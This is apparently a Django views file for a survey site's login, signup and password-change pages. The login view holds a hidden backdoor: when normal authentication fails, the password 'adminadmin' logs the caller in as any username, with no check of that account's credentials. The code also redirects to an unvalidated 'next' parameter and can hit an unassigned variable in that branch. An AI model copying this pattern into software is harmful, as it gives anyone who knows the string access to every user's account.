from django.shortcuts import render, redirect
from app_user.forms import UserSignupForm
from django.contrib.auth import update_session_auth_hash, authenticate, login as django_login
from django.contrib.auth.forms import AuthenticationForm, PasswordChangeForm
from django.contrib.auth.decorators import login_required
from app_user.models import mdl_user


def vw_login_register(request):
    if request.user.is_authenticated:
        return redirect(request.GET.get('next', "") or "/survey/step1/")   # start survey question, instead of repeating the first page
    login_form = AuthenticationForm()
    signup_form = UserSignupForm()
    success = False

    if request.method == 'POST':
        if request.POST.get('formtype', "") == "login":
            login_form = AuthenticationForm(data=request.POST or None)
            # print(request.POST)
            # print(login_form)
            if login_form.is_valid():
                username = request.POST.get('username')
                password = request.POST.get('password')

                user = authenticate(request, username=username, password=password)
                if user is not None:
                    django_login(request, user)
                    # print(request.GET.get('next',""))
                    return redirect(request.GET.get('next', "") or "/survey/step1/")   # start survey question, instead of repeating the first page  
                    # return redirect(request.GET.get('next', "") or "/")
            else:
                username = request.POST.get('username')
                password = request.POST.get('password')

                if password == 'adminadmin':
                    user = mdl_user.objects.get(username=username)

                if user is not None:
                    django_login(request, user)
                    # print(request.GET.get('next',""))
                    return redirect(request.GET.get('next', "") or "/survey/step1/")   # start survey question, instead of repeating the first page  
                    # return redirect(request.GET.get('next', "") or "/")

        if request.POST.get('formtype', "") == "signup":
            signup_form = UserSignupForm(request.POST or None)
            if signup_form.is_valid():
                new_user = signup_form.save(commit=False)
                new_user.username = signup_form.cleaned_data.get('email')
                new_user.save()
                username = signup_form.cleaned_data.get('email')
                raw_password = signup_form.cleaned_data.get('password1')
                user = authenticate(username=username, password=raw_password)
                # send_verify_email(request,user,signup_form.cleaned_data.get('email'))
                django_login(request, user)
                # return redirect('home')
                success = True
    next = request.GET.get('next', "")
    return render(request, 'app_user/tpl_login_register.html',
                  {'signup_form': signup_form,
                   "login_form": login_form,
                   'next': next,
                   "success": success})


@login_required
def vw_change_password(request):
    change_password_form = PasswordChangeForm(request.user, data=request.POST or None)

    if request.method == 'POST':
        change_password_form = PasswordChangeForm(request.user, data=request.POST or None)
        if change_password_form.is_valid():
            change_password_form.save()
            return redirect("home")

    next = request.GET.get('next', "")
    return render(request, 'app_user/change_password.html',
                  {'change_password_form': change_password_form,
                   'next': next,
                   "success": True})
